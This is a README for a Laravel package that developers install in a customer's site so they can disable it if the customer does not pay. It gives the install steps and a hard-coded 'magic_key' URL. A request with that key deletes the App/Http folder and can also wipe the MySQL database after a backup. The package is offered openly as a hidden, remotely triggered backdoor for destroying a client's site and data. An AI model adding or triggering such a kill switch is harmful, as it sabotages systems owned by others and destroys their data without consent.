# Laravel «Repo Man»
Suppose the customer has not paid and you want to deactivate the site if the deadline is reached and he does not pay!

## How to
 1. Install
`composer require webpajooh/laravel-repoman`
 2. Publish repoman.php
`php artisan vendor:publish`
 3. Edit config/repoman.php

## Magic key
There is a `magic_key` option in the configuration file and it is commented by default:  
`'magic_key' => 'Lbs96hv7Fzn28QLSXaIKtAXwlHSDU'`  
You can change the value, and use it when you want:  
example.com/?magic_key=Lbs96hv7Fzn28QLSXaIKtAXwlHSDU  
If we send a request to this link, we will lose the App/Http folder! What about the database? Uncomment `empty_database`, and the package will fresh the database after creating a backup into `storage/app` directory. Consider that we only support MySQL at the moment.
